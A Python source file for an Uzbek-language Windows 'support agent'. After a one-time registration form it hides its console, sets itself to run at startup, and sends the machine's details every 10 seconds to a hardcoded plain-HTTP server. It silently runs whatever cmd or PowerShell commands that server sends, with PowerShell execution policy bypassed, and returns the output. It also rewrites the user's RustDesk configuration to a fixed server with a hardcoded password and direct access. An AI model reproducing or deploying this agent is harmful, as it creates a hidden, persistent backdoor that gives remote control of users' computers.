#!/usr/bin/env python3
"""
UstajonSupport Client Agent v6.0
================================
- Yashirin fon rejimida ishlaydi (GUI faqat birinchi marta)
- Har 10 sekundda heartbeat yuboradi
- RustDesk ID avtomatik topadi va yuboradi
- Remote CMD buyruqlarni bajaradi
- Startup'ga qo'shiladi (avtomatik ishga tushadi)
"""

import os
import sys
import json
import time
import uuid
import socket
import hashlib
import logging
import threading
import subprocess
import ctypes
from pathlib import Path
from datetime import datetime

# ============ CONSTANTS ============
VERSION = "6.0.0"
SERVER_URL = "http://31.220.75.75"
RUSTDESK_KEY = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE="
RUSTDESK_PASSWORD = "ustajon2025"
HEARTBEAT_INTERVAL = 10  # seconds
COMMAND_CHECK_INTERVAL = 5  # seconds
DATA_FILE = Path.home() / ".ustajon_data.json"
LOG_FILE = Path.home() / "ustajon_support.log"

# ============ LOGGING ============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
log = logging.getLogger(__name__)

# ============ HIDE CONSOLE WINDOW ============
def hide_console():
    """Hide console window for background operation"""
    try:
        if sys.platform == 'win32':
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# ============ UTILITIES ============
def get_machine_id():
    """Generate unique machine identifier"""
    try:
        info = f"{socket.gethostname()}-{uuid.getnode()}"
        return hashlib.md5(info.encode()).hexdigest()[:12].upper()
    except:
        return uuid.uuid4().hex[:12].upper()

def get_hostname():
    """Get computer hostname"""
    try:
        return socket.gethostname()
    except:
        return "Unknown"

def get_os_info():
    """Get Windows version"""
    try:
        result = subprocess.run(
            ['wmic', 'os', 'get', 'Caption', '/value'],
            capture_output=True, text=True, timeout=15,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        for line in result.stdout.split('\n'):
            if 'Caption=' in line:
                return line.split('=')[1].strip()
    except:
        pass
    return "Windows"

def get_ip_address():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def load_saved_data():
    """Load saved user data"""
    try:
        if DATA_FILE.exists():
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_data(data):
    """Save user data"""
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        log.error(f"Save data error: {e}")

def add_to_startup():
    """Add to Windows startup"""
    try:
        import winreg
        exe_path = sys.executable if getattr(sys, 'frozen', False) else f'pythonw "{os.path.abspath(__file__)}"'
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "UstajonSupport", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        log.info("Added to startup")
        return True
    except Exception as e:
        log.error(f"Startup error: {e}")
        return False

# ============ RUSTDESK MANAGER ============
class RustDesk:
    """RustDesk ID finder and configurator"""
    
    @staticmethod
    def find_id():
        """Find RustDesk ID from config file"""
        config_paths = [
            Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml",
            Path.home() / "AppData" / "Roaming" / "RustDesk" / "config" / "RustDesk2.toml",
            Path.home() / ".config" / "rustdesk" / "RustDesk2.toml",
        ]
        
        for path in config_paths:
            try:
                if path.exists():
                    content = path.read_text(encoding='utf-8')
                    for line in content.split('\n'):
                        line = line.strip()
                        if line.startswith('id') and '=' in line:
                            rustdesk_id = line.split('=')[1].strip().strip("'\"")
                            if rustdesk_id and len(rustdesk_id) >= 6:
                                log.info(f"RustDesk ID found: {rustdesk_id}")
                                return rustdesk_id
            except:
                continue
        
        # Try registry
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\RustDesk", 0, winreg.KEY_READ)
            rustdesk_id, _ = winreg.QueryValueEx(key, "id")
            winreg.CloseKey(key)
            if rustdesk_id:
                log.info(f"RustDesk ID from registry: {rustdesk_id}")
                return rustdesk_id
        except:
            pass
        
        log.warning("RustDesk ID not found")
        return None
    
    @staticmethod
    def configure_server():
        """Configure RustDesk to use our server"""
        config_path = Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml"
        
        try:
            config_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Read existing config
            config = {}
            if config_path.exists():
                content = config_path.read_text(encoding='utf-8')
                for line in content.split('\n'):
                    if '=' in line:
                        key, val = line.split('=', 1)
                        config[key.strip()] = val.strip()
            
            # Update server settings
            config['rendezvous_server'] = "'31.220.75.75'"
            config['key'] = f"'{RUSTDESK_KEY}'"
            config['password'] = f"'{RUSTDESK_PASSWORD}'"
            config['direct-server'] = "'Y'"
            config['direct-access-port'] = "'21118'"
            
            # Write config
            with open(config_path, 'w', encoding='utf-8') as f:
                for key, val in config.items():
                    f.write(f"{key} = {val}\n")
            
            log.info("RustDesk configured")
            return True
        except Exception as e:
            log.error(f"RustDesk config error: {e}")
            return False
    
    @staticmethod
    def is_running():
        """Check if RustDesk is running"""
        try:
            result = subprocess.run(
                ['tasklist', '/FI', 'IMAGENAME eq rustdesk.exe'],
                capture_output=True, text=True, timeout=10,
                creationflags=0x08000000
            )
            return 'rustdesk.exe' in result.stdout.lower()
        except:
            return False
    
    @staticmethod
    def start():
        """Start RustDesk"""
        paths = [
            Path(os.environ.get('PROGRAMFILES', '')) / "RustDesk" / "rustdesk.exe",
            Path(os.environ.get('LOCALAPPDATA', '')) / "RustDesk" / "rustdesk.exe",
        ]
        
        for path in paths:
            if path.exists():
                try:
                    subprocess.Popen(
                        [str(path), '--service'],
                        creationflags=0x08000000 | 0x00000008  # CREATE_NO_WINDOW | DETACHED_PROCESS
                    )
                    log.info(f"RustDesk started: {path}")
                    return True
                except:
                    continue
        return False

# ============ REMOTE COMMAND EXECUTOR ============
class CommandExecutor:
    """Execute remote commands"""
    
    @staticmethod
    def run_cmd(command):
        """Run CMD command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120,
                creationflags=0x08000000
            )
            output = result.stdout + result.stderr
            return True, output[:8000]
        except subprocess.TimeoutExpired:
            return False, "Timeout (120s)"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def run_powershell(command):
        """Run PowerShell command"""
        try:
            result = subprocess.run(
                ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', command],
                capture_output=True,
                text=True,
                timeout=120,
                creationflags=0x08000000
            )
            output = result.stdout + result.stderr
            return True, output[:8000]
        except subprocess.TimeoutExpired:
            return False, "Timeout (120s)"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def get_sysinfo():
        """Get system information"""
        info = []
        info.append(f"Hostname: {get_hostname()}")
        info.append(f"OS: {get_os_info()}")
        info.append(f"IP: {get_ip_address()}")
        info.append(f"Agent: v{VERSION}")
        
        try:
            # CPU
            result = subprocess.run(
                ['wmic', 'cpu', 'get', 'Name', '/value'],
                capture_output=True, text=True, timeout=15,
                creationflags=0x08000000
            )
            for line in result.stdout.split('\n'):
                if 'Name=' in line:
                    info.append(f"CPU: {line.split('=')[1].strip()}")
            
            # RAM
            result = subprocess.run(
                ['wmic', 'computersystem', 'get', 'TotalPhysicalMemory', '/value'],
                capture_output=True, text=True, timeout=15,
                creationflags=0x08000000
            )
            for line in result.stdout.split('\n'):
                if 'TotalPhysicalMemory=' in line:
                    ram = int(line.split('=')[1].strip()) / (1024**3)
                    info.append(f"RAM: {ram:.1f} GB")
        except:
            pass
        
        return True, '\n'.join(info)

# ============ HTTP CLIENT ============
class HttpClient:
    """Simple HTTP client using urllib"""
    
    @staticmethod
    def post(url, data):
        """POST JSON data"""
        try:
            import urllib.request
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode('utf-8'),
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            log.debug(f"POST error: {e}")
            return None
    
    @staticmethod
    def get(url):
        """GET JSON data"""
        try:
            import urllib.request
            req = urllib.request.Request(url, method='GET')
            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            log.debug(f"GET error: {e}")
            return None

# ============ MAIN AGENT ============
class Agent:
    """Main support agent"""
    
    def __init__(self):
        self.client_id = get_machine_id()
        self.running = True
        self.user_data = load_saved_data()
        self.rustdesk_id = None
        self.first_run = not self.user_data.get('registered', False)
        
        log.info(f"=" * 50)
        log.info(f"UstajonSupport Agent v{VERSION}")
        log.info(f"Client ID: {self.client_id}")
        log.info(f"First run: {self.first_run}")
        log.info(f"=" * 50)
    
    def init_rustdesk(self):
        """Initialize RustDesk"""
        # Configure server
        RustDesk.configure_server()
        
        # Start if not running
        if not RustDesk.is_running():
            RustDesk.start()
            time.sleep(3)
        
        # Get ID
        for _ in range(10):
            self.rustdesk_id = RustDesk.find_id()
            if self.rustdesk_id:
                break
            time.sleep(1)
        
        log.info(f"RustDesk ID: {self.rustdesk_id or 'Not found'}")
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        # Get fresh RustDesk ID
        if not self.rustdesk_id:
            self.rustdesk_id = RustDesk.find_id()
        
        data = {
            "client_id": self.client_id,
            "rustdesk_id": self.rustdesk_id or "",
            "hostname": get_hostname(),
            "os_info": get_os_info(),
            "version": VERSION,
            "name": self.user_data.get('name', ''),
            "phone": self.user_data.get('phone', ''),
            "problem": self.user_data.get('problem', ''),
            "local_ip": get_ip_address()
        }
        
        result = HttpClient.post(f"{SERVER_URL}/api/heartbeat", data)
        if result and result.get('success'):
            log.debug("Heartbeat sent successfully")
            return True
        else:
            log.debug("Heartbeat failed")
            return False
    
    def check_commands(self):
        """Check and execute pending commands"""
        commands = HttpClient.get(f"{SERVER_URL}/api/agent/commands?client_id={self.client_id}")
        
        if not commands:
            return
        
        for cmd in commands:
            if cmd.get('status') != 'pending':
                continue
            
            cmd_id = cmd.get('id')
            cmd_type = cmd.get('type', 'cmd')
            command = cmd.get('command', '')
            
            log.info(f"Executing [{cmd_type}]: {command[:50]}...")
            
            # Execute command
            if cmd_type == 'powershell':
                success, output = CommandExecutor.run_powershell(command)
            elif cmd_type in ('sysinfo', 'system_info'):
                success, output = CommandExecutor.get_sysinfo()
            else:
                success, output = CommandExecutor.run_cmd(command)
            
            # Send result
            result_data = {
                "client_id": self.client_id,
                "command_id": cmd_id,
                "success": success,
                "output": output
            }
            HttpClient.post(f"{SERVER_URL}/api/agent/command-result", result_data)
            log.info(f"Command result sent: {cmd_id}")
    
    def heartbeat_loop(self):
        """Background heartbeat loop"""
        while self.running:
            try:
                self.send_heartbeat()
            except Exception as e:
                log.error(f"Heartbeat error: {e}")
            time.sleep(HEARTBEAT_INTERVAL)
    
    def command_loop(self):
        """Background command check loop"""
        while self.running:
            try:
                self.check_commands()
            except Exception as e:
                log.error(f"Command check error: {e}")
            time.sleep(COMMAND_CHECK_INTERVAL)
    
    def show_registration_gui(self):
        """Show registration GUI (only on first run)"""
        try:
            import tkinter as tk
            from tkinter import messagebox
            
            root = tk.Tk()
            root.title("UstajonSupport")
            root.geometry("400x520")
            root.resizable(False, False)
            root.configure(bg='#0d1117')
            
            # Center
            root.update_idletasks()
            x = (root.winfo_screenwidth() - 400) // 2
            y = (root.winfo_screenheight() - 520) // 2
            root.geometry(f"+{x}+{y}")
            
            # Header
            tk.Label(root, text="🔧", font=('Segoe UI', 36), bg='#0d1117', fg='#58a6ff').pack(pady=(30, 5))
            tk.Label(root, text="Texnik Yordam", font=('Segoe UI', 20, 'bold'), bg='#0d1117', fg='white').pack()
            tk.Label(root, text="Ma'lumotlaringizni kiriting", font=('Segoe UI', 10), bg='#0d1117', fg='#8b949e').pack(pady=(5, 25))
            
            # Form
            form = tk.Frame(root, bg='#0d1117')
            form.pack(padx=40, fill='x')
            
            # Name
            tk.Label(form, text="Ismingiz:", bg='#0d1117', fg='#c9d1d9', font=('Segoe UI', 10), anchor='w').pack(fill='x')
            name_entry = tk.Entry(form, font=('Segoe UI', 12), bg='#21262d', fg='white', insertbackground='white', relief='flat', bd=8)
            name_entry.pack(fill='x', pady=(5, 15))
            
            # Phone
            tk.Label(form, text="Telefon:", bg='#0d1117', fg='#c9d1d9', font=('Segoe UI', 10), anchor='w').pack(fill='x')
            phone_entry = tk.Entry(form, font=('Segoe UI', 12), bg='#21262d', fg='white', insertbackground='white', relief='flat', bd=8)
            phone_entry.insert(0, "+998")
            phone_entry.pack(fill='x', pady=(5, 15))
            
            # Problem
            tk.Label(form, text="Muammo:", bg='#0d1117', fg='#c9d1d9', font=('Segoe UI', 10), anchor='w').pack(fill='x')
            problem_entry = tk.Text(form, font=('Segoe UI', 11), bg='#21262d', fg='white', insertbackground='white', relief='flat', height=3, bd=8)
            problem_entry.pack(fill='x', pady=(5, 15))
            
            # RustDesk ID
            id_frame = tk.Frame(form, bg='#161b22')
            id_frame.pack(fill='x', pady=10)
            tk.Label(id_frame, text="RustDesk ID:", bg='#161b22', fg='#8b949e', font=('Segoe UI', 9)).pack(anchor='w', padx=10, pady=(8, 0))
            id_label = tk.Label(id_frame, text=self.rustdesk_id or "Aniqlanmoqda...", bg='#161b22', fg='#58a6ff', font=('Consolas', 16, 'bold'))
            id_label.pack(anchor='w', padx=10, pady=(2, 8))
            
            def submit():
                name = name_entry.get().strip()
                phone = phone_entry.get().strip()
                problem = problem_entry.get('1.0', 'end').strip()
                
                if not name:
                    messagebox.showwarning("Xatolik", "Ismingizni kiriting!")
                    return
                if len(phone) < 9:
                    messagebox.showwarning("Xatolik", "Telefon raqamini kiriting!")
                    return
                
                # Save data
                self.user_data = {
                    'name': name,
                    'phone': phone,
                    'problem': problem or 'Belgilanmagan',
                    'registered': True,
                    'registered_at': datetime.now().isoformat()
                }
                save_data(self.user_data)
                
                # Send heartbeat immediately
                self.send_heartbeat()
                
                # Add to startup
                add_to_startup()
                
                messagebox.showinfo("Tayyor!", 
                    "✅ Ma'lumotlar yuborildi!\n\n"
                    "Mutaxassis tez orada bog'lanadi.\n\n"
                    "Dastur fon rejimida ishlaydi.")
                root.destroy()
            
            # Submit button
            submit_btn = tk.Button(form, text="✓ YUBORISH", font=('Segoe UI', 13, 'bold'),
                                  bg='#238636', fg='white', activebackground='#2ea043',
                                  relief='flat', cursor='hand2', command=submit, pady=10)
            submit_btn.pack(fill='x', pady=(15, 10))
            
            # Update RustDesk ID
            def update_id():
                if not self.rustdesk_id:
                    self.rustdesk_id = RustDesk.find_id()
                if self.rustdesk_id:
                    id_label.config(text=self.rustdesk_id)
                if root.winfo_exists():
                    root.after(2000, update_id)
            root.after(1000, update_id)
            
            root.mainloop()
            
        except Exception as e:
            log.error(f"GUI error: {e}")
            # Continue without GUI
            self.user_data = {'name': 'Auto', 'phone': '', 'problem': '', 'registered': True}
            save_data(self.user_data)
    
    def run(self):
        """Main run method"""
        # Initialize RustDesk
        self.init_rustdesk()
        
        # Show GUI only on first run
        if self.first_run:
            self.show_registration_gui()
        else:
            log.info("Already registered, running in background...")
            hide_console()
        
        # Start background threads
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.command_loop, daemon=True).start()
        
        log.info("Agent started - running in background")
        
        # Keep alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            log.info("Agent stopped")
            self.running = False


# ============ ENTRY POINT ============
if __name__ == "__main__":
    try:
        agent = Agent()
        agent.run()
    except Exception as e:
        log.error(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
